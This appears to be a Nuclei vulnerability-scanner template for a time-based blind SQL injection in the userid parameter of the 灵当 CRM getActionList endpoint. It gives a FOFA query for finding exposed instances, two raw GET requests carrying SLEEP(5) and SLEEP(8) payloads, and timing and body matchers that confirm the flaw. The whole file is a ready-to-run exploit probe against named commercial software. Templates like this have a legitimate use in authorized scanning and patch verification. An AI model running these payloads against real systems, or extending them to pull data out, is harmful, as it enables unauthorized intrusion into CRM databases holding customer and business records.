id: poc-yaml-51mis-crm-getactionList-userid-sqli
info:
  name: "灵当 CRM getActionList userid 参数 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 灵当 CRM
  metadata:
    finger: 灵当CRM
    fofa: |
      body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")

http:
  - raw:
      - |
        GET /crm/WeiXinApp/marketing/index.php?module=Users&action=getActionList&userid=%27%20AND%20(SELECT%203408%20FROM%20(SELECT(SLEEP(5)))HtiS)--%20cbVc--+ HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /crm/WeiXinApp/marketing/index.php?module=Users&action=getActionList&userid=%27%20AND%20(SELECT%203408%20FROM%20(SELECT(SLEEP(8)))HtiS)--%20cbVc--+ HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"result"'
          - '"code":1'
          - '"msg":"success"'
        condition: and
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
      - type: word
        part: body
        words:
          - "<"
        negative: true

